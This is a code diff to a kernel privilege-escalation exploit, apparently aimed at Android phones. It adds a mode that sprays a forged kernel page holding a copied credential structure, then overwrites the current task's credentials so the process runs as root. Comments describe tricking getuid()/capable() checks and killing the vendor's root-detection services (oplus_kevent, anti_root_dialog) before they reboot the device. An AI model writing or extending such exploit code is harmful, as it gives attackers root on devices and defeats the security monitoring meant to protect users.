@@ -2181,6 +2181,17 @@ static int uid0_cred_walk(void) {
     live_sync_log("UID0", "direct_punch");
     unsetenv("MODE4_SLIDE_ZERO");
     setenv("MODE4_SLIDE_CRED", "1", 1); /* cred_mode: no re-spray, checked retry */
+    /* MODE4_CRED_PI needs the sprayed Image-verbatim cred copy as the
+     * pi-store VALUE — DIRECT skips the normal spray, so spray here. */
+    if (env_flag("MODE4_CRED_PI", 0) && !g_cred_copy) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      pr_info("CRED_PI spray: base=%016zx cred_copy=%016zx\n",
+              page_base, g_cred_copy);
+      if (!page_base) {
+        pr_error("CRED_PI spray failed\n");
+        return 1;
+      }
+    }
     goto uid0_cred_punch;
   }
   if (env_flag("MODE4_NULL_STORE", 0)) {
@@ -2519,7 +2530,11 @@ uid0_cred_punch:;
    * One store only: *task.cred = init_cred (Z25 geometry lived).
    */
   (void)wrapped;
-  g_cred_copy = 0;
+  /* MODE4_CRED_PI keeps the sprayed Image-verbatim cred copy as the
+   * pi-store VALUE (its usage points at a zeroed slot — terminating
+   * rebalance). Other modes fall back to init_cred as before. */
+  if (!env_flag("MODE4_CRED_PI", 0))
+    g_cred_copy = 0;
   /* One punch. Subjective cred so getuid()/capable() see 0 (Z33 real_cred
    * only fooled /proc/status). Kernel kevent fires on 2000→0; kill the
    * userspace half (oplus_kevent / anti_root_dialog) before it reboots. */
